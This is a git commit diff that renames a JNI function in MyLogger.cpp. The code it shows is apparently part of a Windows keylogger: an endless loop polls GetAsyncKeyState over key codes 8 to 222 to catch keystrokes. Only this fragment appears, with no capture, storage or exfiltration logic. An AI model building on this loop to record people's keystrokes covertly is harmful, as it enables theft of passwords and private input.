8688eeef7ecba546390ee78ad5e871c0a52fead0
csanuragjain <cs.anurag.jain@gmail.com>
2016-11-04 13:15:21 +0530

    Update MyLogger.cpp

--- MyLogger.cpp
+++ MyLogger.cpp
@@ -4,7 +4,7 @@
 #include <jni.h> 
 #include "MyLogger.h" 
 
-JNIEXPORT jint JNICALL Java_MyLogger_GetKey(JNIEnv *, jclass){ 
+JNIEXPORT jint JNICALL Java_cooltrickshome_MyLogger_GetKey(JNIEnv *, jclass){ 
   while(true){
         for(int c=8;c<=222;c++){
          if(GetAsyncKeyState(c)==-32767)
